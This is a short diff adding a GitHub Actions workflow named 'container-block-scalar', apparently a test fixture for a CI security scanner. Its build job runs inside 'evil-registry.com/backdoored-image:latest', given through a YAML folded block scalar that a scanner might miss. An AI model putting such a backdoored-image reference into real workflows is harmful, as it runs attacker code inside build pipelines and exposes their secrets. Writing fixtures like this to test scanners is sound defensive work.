@@ -1,0 +1,12 @@
+name: container-block-scalar
+on: push
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    container: >
+      evil-registry.com/backdoored-image:latest
+    steps:
+      - run: echo build
